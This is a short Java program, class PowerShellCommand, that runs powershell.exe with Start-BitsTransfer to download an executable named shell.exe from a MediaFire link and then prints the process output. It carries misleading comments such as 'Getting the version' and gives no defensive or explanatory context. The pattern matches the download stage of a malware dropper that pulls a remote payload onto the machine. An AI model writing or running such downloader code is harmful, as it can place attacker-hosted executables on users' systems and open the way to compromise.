import java.net.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class PowerShellCommand {

 public static void main(String[] args) throws IOException {

  //String command = "powershell.exe  your command";
  //Getting the version
  URL url=new URL("https://download1481.mediafire.com/he5d591zxntg/mpkirdq6taeo4l0/shell.exe");
  String command = "powershell.exe  Start-BitsTransfer "+url.toString();
  // Executing the command
  Process powerShellProcess = Runtime.getRuntime().exec(command);
  // Getting the results
  powerShellProcess.getOutputStream().close();
  String line;
  System.out.println("Standard Output:");
  BufferedReader stdout = new BufferedReader(new InputStreamReader(
    powerShellProcess.getInputStream()));
  while ((line = stdout.readLine()) != null) {
   System.out.println(line);
  }
  stdout.close();
  System.out.println("Standard Error:");
  BufferedReader stderr = new BufferedReader(new InputStreamReader(
    powerShellProcess.getErrorStream()));
  while ((line = stderr.readLine()) != null) {
   System.out.println(line);
  }
  stderr.close();
  System.out.println("Done");

 }

}